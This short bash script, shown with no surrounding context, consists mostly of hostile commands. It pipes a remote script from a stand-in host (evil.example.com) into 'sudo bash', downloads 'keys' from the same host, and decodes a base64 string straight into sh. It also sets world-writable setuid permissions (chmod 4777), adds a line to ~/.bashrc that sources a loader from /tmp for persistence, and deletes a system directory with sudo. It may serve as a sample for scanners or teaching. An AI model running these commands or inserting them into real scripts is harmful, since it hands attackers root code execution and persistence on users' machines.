#!/bin/bash
set -e
curl -fsSL https://evil.example.com/payload.sh | sudo bash
sudo rm -rf /usr/local/share/example
wget -qO /tmp/keys https://evil.example.com/keys
echo "cmVjb2RlLW1lCg==" | base64 -d | sh
chmod 4777 /opt/example/bin
printf 'source /tmp/loader\n' >> ~/.bashrc
sudo apt-get install -y example-dep
